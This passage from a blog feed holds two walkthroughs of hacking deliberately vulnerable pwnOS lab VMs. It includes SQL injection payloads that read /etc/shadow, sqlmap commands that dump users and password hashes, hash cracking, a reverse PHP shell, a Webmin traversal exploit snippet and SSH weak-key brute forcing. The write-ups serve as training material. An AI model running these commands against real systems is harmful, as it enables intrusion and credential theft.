<a href="news:x:9:9:news:/var/spool/news:/bin/sh">news:x:9:9:news:/var/spool/news:/bin/sh</a>
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
syslog:x:101:103::/home/syslog:/bin/false
mysql:x:0:0:MySQL Server,,,:/root:/bin/bash
sshd:x:103:65534::/var/run/sshd:/usr/sbin/nologin
landscape:x:104:110::/var/lib/landscape:/bin/false
dan:x:1000:1000:Dan Privett,,,:/home/dan:/bin/bash
echo -n &rsquo;/etc/shadow' | xxd -ps &ndash;
2f6574632f736861646f77
&lsquo; UNION SELECT 1,2,3,load_file(0x2f6574632f736861646f77),5,6,7,8&mdash; &ndash;
Welcome
```</p></blockquote>

<p>Hm, looks like we can&rsquo;t hit /etc/shadow.  Weird.  Lets move on to rapidly enumerating the back end.  I switched over to sqlmap to give more info on the backend.  We already know the vulnerable form, we know the POST format (from our Burp session), and we know the database (from UNION queries above) so lets plug that in for some interesting stuff.</p>

<p>```</p>

<blockquote><p>python sqlmap.py -u &lsquo;<a href="http://10.10.10.100/login.php">http://10.10.10.100/login.php</a>&rsquo; &mdash;data=&lsquo;email=bleh&amp;pass=bleh&amp;submit=Login&amp;submitted=True&rsquo; -p &lsquo;email&rsquo; &mdash;tables -D &lsquo;ch16&rsquo;
Database: ch16
Table: users
```</p></blockquote>

<p>One table.  Let&rsquo;s check it out:</p>

<p>```</p>

<blockquote><p>python sqlmap.py -u &lsquo;<a href="http://10.10.10.100/login.php">http://10.10.10.100/login.php</a>&rsquo; &mdash;data=&lsquo;email=bleh&amp;pass=bleh&amp;submit=Login&amp;submitted=TRUE&rsquo; -p &lsquo;email&rsquo; &mdash;columns -T &lsquo;users&rsquo; &mdash;dump  <br/>
```</p></blockquote>

<p>This gave me a single user, &lsquo;Dan&rsquo;, with a user level 0 and his hash: <code>c2c4b4e51d9e23c02c15702c136c3e950ba9a4af</code></p>

<p>I let sqlmap run its own cracker against the hash, then dumped it into oclHashCat:<br/>
<code>cudaHashCat-plus64 -m 300 -a 3 -n 50 --gpu-watchdog=100 --force hash.txt ?l?l?l?l?l?l?l?l</code></p>

<p>I then dumped database users to see what was there, and what the hashes were (assumed sha1(sha1(pass)), but you never know)</p>

<p>```</p>

<blockquote><p>python sqlmap.py -u &lsquo;<a href="http://10.10.10.100/login.php">http://10.10.10.100/login.php</a>&rsquo; &mdash;data=&lsquo;email=bleh&amp;pass=bleh&amp;submit=Login&amp;submitted=TRUE&rsquo; -p &lsquo;email&rsquo; &mdash;users
database management system users [108]:</p>

<pre><code>      [*] 'debian-sys-maint'@'localhost'
      [*] 'root'@'127.0.0.1'
      [*] 'root'@'localhost'
      [*] 'root'@'web'
</code></pre>

<p>python sqlmap.py -u &lsquo;<a href="http://10.10.10.100/login.php">http://10.10.10.100/login.php</a>&rsquo; &mdash;data=&lsquo;email=bleh&amp;pass=bleh&amp;submit=Login&amp;submitted=TRUE&rsquo; -p &lsquo;email&rsquo; &mdash;passwords</p>

<pre><code>      [23:11:18] [INFO] fetching database users password hashes
      [23:11:18] [INFO] the SQL query used returns 4 entries
      [23:11:18] [INFO] retrieved: "root","*248E4800AB95A1E412A83374AD8366B0C0780FFF"
      [23:11:18] [INFO] retrieved: "root","*248E4800AB95A1E412A83374AD8366B0C0780FFF"                      
      [23:11:18] [INFO] retrieved: "root","*248E4800AB95A1E412A83374AD8366B0C0780FFF"                      
      [23:11:18] [INFO] retrieved: "debian-sys-maint","*9366FE2112E650C8E5523AE337B10A625C727943" 
</code></pre>

<p>```</p></blockquote>

<p>Pretty much what I expected.  At this point I figured the next best thing to try, with my root privileges and all, is UDF injection.  If you&rsquo;re unfamiliar with UDF&rsquo;s, here&rsquo;s a very brief breakdown: a user defined function is a way to extend the functionality of a database by providing a function that&rsquo;s able to be evaluated by the backend database server.  In our case, we want something akin to an eval() or exec().  This can be done with the lib_mysqludf_sys library.  If you want more information on UDF injection, read <a href="https://www.blackhat.com/presentations/bh-europe-09/Guimaraes/Blackhat-europe-09-Damele-SQLInjection-whitepaper.pdf">this</a> fantastic paper from BlackHat 2009 by Damele.</p>

<p>Our attack method is then this: upload the precompiled library into the MySQL plugin directory, create our custom function, and execute some good stuff (passwd, addusr, whatever).  I first needed to know where the plugin directory was.  A quick <a href="https://dev.mysql.com/doc/refman/5.0/en/server-system-variables.html">google</a> of MySQL system variables gives us an answer:</p>

<p><code>
' UNION SELECT 1,2,3,@@plugin_dir,5,6,7,8-- -
Welcome /usr/lib/mysql/plugin
</code></p>

<p>Now we just need to write our library there and create the functions:</p>

<p><code>
python sqlmap.py -u 'http://10.10.10.100/login.php' --data='email=bleh&amp;pass=bleh&amp;submit=Login&amp;submitted=TRUE' -p 'email' --file-write=/lib_mysqludf_sys --file-dest=/usr/lib/mysql/plugin/
CREATE FUNCTION sys_exec RETURNS STRING SONAME lib_mysqludf_sys.so
SELECT * FROM information_schema.routines
</code></p>

<p>The final SELECT there does not return our newly created function.  According to MySQL documentation, we need INSERT privileges.  Do we have them?</p>

<p>```
[*] &lsquo;root&rsquo;@&lsquo;localhost&rsquo; (administrator) [27]:</p>

<pre><code>            privilege: ALTER
            privilege: ALTER ROUTINE
            privilege: CREATE
            privilege: CREATE ROUTINE
            privilege: CREATE TEMPORARY TABLES
            privilege: CREATE USER
            privilege: CREATE VIEW
            privilege: DELETE
            privilege: DROP
            privilege: EVENT
            privilege: EXECUTE
            privilege: FILE
            privilege: INDEX
            privilege: INSERT
            privilege: LOCK TABLES
            privilege: PROCESS
            privilege: REFERENCES
            privilege: RELOAD
            privilege: REPLICATION CLIENT
            privilege: REPLICATION SLAVE
            privilege: SELECT
            privilege: SHOW DATABASES
            privilege: SHOW VIEW
            privilege: SHUTDOWN
            privilege: SUPER
            privilege: TRIGGER
            privilege: UPDATE
</code></pre>

<p>```</p>

<p>It appears we do.  In fact, it doesn&rsquo;t seem we have write access to anything; we can&rsquo;t even INSERT into any tables.  We&rsquo;ll come back to why this doesn&rsquo;t work in a bit.  For now, I threw a reverse PHP shell on the box for more control.  I used pentestmonkey&rsquo;s great php-reverse-shell, and soon enough had a prompt:</p>

<p><img class="center" src="/images/posts/2012/pwnos2_shell.jpg"></p>

<p>I&rsquo;m going to cut out a lot of my trial/error in finding some of this stuff, but note that there is a blog in /var/www.  This provides Simple PHP Blog, which just so happens to be <a href="http://www.exploit-db.com/search/?action=search&amp;filter_page=1&amp;filter_description=Simple+PHP+Blog&amp;filter_exploit_text=&amp;filter_author=&amp;filter_platform=0&amp;filter_type=0&amp;filter_lang_id=0&amp;filter_port=&amp;filter_osvdb=&amp;filter_cve=">vulnerable</a> to LFI; so there&rsquo;s another attack vector for the reverse PHP shell.  Also note the mysqld is listening on 127.0.0.1, which rules out that complex exploit David Kennedy <a href="http://www.exploit-db.com/exploits/19092/">wrote</a>.  Not to mention we&rsquo;re not in a real term.</p>

<p>Note that there are no privilege escalation vulnerabilities for that kernel or for that Ubuntu distribution.  MySQL does not appear to be UDF-injectable, and even though it&rsquo;s telling us we&rsquo;re root@localhost, we simply don&rsquo;t have it.  It is also worth nothing that an attempt to drop a shell script in /etc/cron.d/ and adding a cron entry got AppArmor a bit upset.</p>

<p>My next step was to see if there were any vulnerable binaries uploaded.</p>

<p><code>
find $1 -type f -print0 | xargs -0 stat --format '%Y :%y %n' | sort -nr | cut -d: -f2- &gt; /tmp/dump.txt
</code></p>

<p>This dumped modified files by date, so newest at the top, oldest at the bottom.  After getting through all the modified /proc&rsquo;s, I noticed this monster: fakeroot.  Essentially this emulates a root environment but only allows certain file manipulations.  It can be used to run daemons in an environment that&rsquo;s root-like, but not.  This had to be why my MySQL UDF attempts were not working.  Moving on down the list, I noticed another file: /var/mysqli_connect.php.  Weird, what&rsquo;s a PHP file doing in var?</p>

<p>```</p>

<blockquote><p>cat /var/mysqli_connect.php
[&hellip;]
// Set the database access information as constants:
  DEFINE (&lsquo;DB_USER&rsquo;, &lsquo;root&rsquo;);
  DEFINE (&lsquo;DB_PASSWORD&rsquo;, &lsquo;root@ISIntS&rsquo;);
  DEFINE (&lsquo;DB_HOST&rsquo;, &lsquo;localhost&rsquo;);
  DEFINE (&lsquo;DB_NAME&rsquo;, &lsquo;ch16&rsquo;);
[&hellip;]
```</p></blockquote>

<p>Oh.  That&rsquo;s&hellip;it?  Really?  Knowing that root was permitted to ssh in, I quickly gave it a shot:</p>

<p><img class="center" src="/images/posts/2012/pwnos2_root.jpg"></p>

<p>Yup.  That was it.  I suppose the idea here is that incompetent developers can hard code root passwords into arbitrary PHP files laying around the system, but it just seems like more of a scavenger hunt in the end.  I was really hoping there was some obscure vulnerability in a binary, or some fun MySQL UDF injection I could&rsquo;ve done.</p>

<p>All in all, fun, but once you&rsquo;ve got a shell its an exercise in frustration.  Can&rsquo;t say I didn&rsquo;t learn anything though.</p>

<p>Note:  If you&rsquo;re running BackTrack5 and need certain VirtualBox features (bidirectional clipboard, shared folders, etc.), you&rsquo;ll need to prepare kernel headers first.  Follow <a href="http://www.backtrack-linux.org/wiki/index.php/Preparing_Kernel_Headers">these</a> instructions before installing Guest Additions.  If you&rsquo;ve got it installed, just reinstall them.  You&rsquo;ll know it&rsquo;s successful if you don&rsquo;t get &lsquo;could not find kernel headers&rsquo; errors.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[solving pwn0s]]></title>
    <link href="http://hatRiot.github.io/blog/2012/06/07/solving-pwn0s/"/>
    <updated>2012-06-07T01:15:10-06:00</updated>
    <id>http://hatRiot.github.io/blog/2012/06/07/solving-pwn0s</id>
    <content type="html"><![CDATA[<p>pwnOS is a vulnerable VM used in penetration testing and vulnerability assessment.  I thought this one was pretty fun, so I&rsquo;ve decided to do a little write up in the various ways it can be attacked.  The VM for it can be found on forums.hackingdojo.com; you need an account to access the forums, but it&rsquo;s worth it.</p>

<p>The VM comes packaged as a split vmdk, so just loading up the vmx sets everything up.  Booting it up and flipping over to BackTrack, a quick nmap scan gives us a few immediate vectors of attack:</p>

<p><img src="/images/posts/2012/scan.jpg" title="&lsquo;image&rsquo; &lsquo;images&rsquo;" ></p>

<p>So there&rsquo;s a few notable things here; the OpenSSH version, specifically that Debian build, is known to generate weak, predictable SSH keys.  This vulnerability is due to a side-effect of removing a bit of code that effected the initial seeding for the PRNG; instead of seeding it with true, random data, it instead only used a process ID. There are a total of 32,768 process ID&rsquo;s available, meaning, only 32,768 potential seeds to the PRNG.  We can attack this by generating a 2048 bit key (that&rsquo;s the bit size of the RSA key, according to nmap) 32,768 times with the number as a seed.  We&rsquo;ll set this aside, for now, and come back to it.</p>

<p>There&rsquo;s an HTTP server up with some plaintext HTML on it, but nothing worthy of any web-side exploits.  That version of Apache has some DoS vulnerabilities, but that doesn&rsquo;t do much for us.</p>

<p>The next interesting port is actually on 10000; MiniServ is a fairly obscure, hyperminimal web server written in C.  It&rsquo;s barely supported and has a very low exposure level.  On the frontend runs WebMin, a PHP interface for HTTP servers.  As it happens to turn out, there&rsquo;s a vulnerability allowing an attacker to retrieve unauthorized remote files.  This will work harmoniously with our OpenSSH vulnerability above!  I pulled some perl code from <a href="http://www.exploit-db.com/exploits/2017/">here</a> and dumped a few things:</p>

<p><img src="/images/posts/2012/webmin.jpg" title="&lsquo;image&rsquo; &lsquo;images&rsquo;" ></p>

<p>Oh boy users!  Lets back up for a minute and take a look at this exploit.  If we pop open the perl code, we see a little bit of this:</p>

<p>```
 $temp=&ldquo;/..%01&rdquo; x 40;</p>

<pre><code>    if ($tar == '0')
       { my $url= "http://". $target. ":" . $port ."/unauthenticated/".$temp . $filename;
        $content=get $url;

        print("\n FILE CONTENT STARTED");
        print("\n -----------------------------------\n");

        print("$content");
        print("\n -------------------------------------\n");
        }
</code></pre>

<p>```</p>

<p>That&rsquo;s about as easy as it gets when it comes to exploits; we&rsquo;re filling up the url with /..%01.  It does this 40 times until the buffer is full, then appends the filename onto the end.    I dug into the Webmin source code to see exactly what was going on; diffing 1.28 and 1.29, I found this:</p>

<p><img src="/images/posts/2012/diff.jpg" title="&lsquo;image&rsquo; &lsquo;images&rsquo;" ></p>

<p>Essentially it was checking for a directory traversal in the path, but only checking &ldquo;..&rdquo;.  In our exploit, we&rsquo;re appending a %01, which is the ASCII Start of Header.  This final, encoded ASCII code can be any control code; that&rsquo;s %00 &ndash; %1F (<a href="http://www.w3schools.com/tags/ref_urlencode.asp">codes</a>).  This works because these codes have no purpose in the URL and do not decode to anything useful; they merely throw off the $b eq &ldquo;..&rdquo; check by doing nothing.  The remainder of the code is left as an exercise for the reader.</p>

<p>Now that we&rsquo;ve got a few names, we can run through RSA keys and see if we get a match.  HD Moore of Metasploit has already generated and distributed the keys, and can be retrieved <a href="http://metasploit.com/users/hdm/tools/debian-openssl/">here</a>.  Got &lsquo;em?  Cool; now we can test keys against the usernames in the file.  I used <a href="http://www.exploit-db.com/exploits/5632/">this</a> to iterate through them, but it shouldn&rsquo;t be too hard to code it up yourself.  Essentially we just want to connect to the server with one of the usernames with the generated keys; when we pop a shell, we know we&rsquo;re in:</p>

<p><img src="/images/posts/2012/brute.jpg" title="&lsquo;image&rsquo; &lsquo;images&rsquo;" ></p>

<p>So now we&rsquo;ve got ourselves a private RSA key for account &lsquo;obama&rsquo;.  Testing it out, and&hellip;</p>

<p><img src="/images/posts/2012/ssh.jpg" title="&lsquo;image&rsquo; &lsquo;images&rsquo;" ></p>

<p>Success!  So now we&rsquo;ve got a valid account on the box.  We see it&rsquo;s an x86 Ubuntu machine on the 2.6.22 kernel.  What can we do?  Well, immediately I recognize a major vulnerability in the kernel version.  A bit of googling will turn up the vmsplice exploit.  The exploit itself is in fact a chaining of three separate, now patched, vulnerabilities in the fs/splice.c module.  I will let the fantastic article at <a href="https://lwn.net/Articles/268783/">lwn</a> describe the vulnerability in more detail, and instead put it to some use here:</p>

<p><img src="/images/posts/2012/vmsplice_root.jpg" title="&lsquo;image&rsquo; &lsquo;images&rsquo;" ></p>

<p>And just like that we&rsquo;ve got root on the box.</p>

<p>Other avenues of attack could be sticking Medusa/Hydra on the SSH port and letting it brute force the accounts, exploiting remote uploads to MiniServ, or the local ftruncate root exploit.  Though fairly easy and straightforward (I didn&rsquo;t have to write a line of code), this VM was fun to toy around with.</p>
]]></content>
  </entry>
  
</feed>
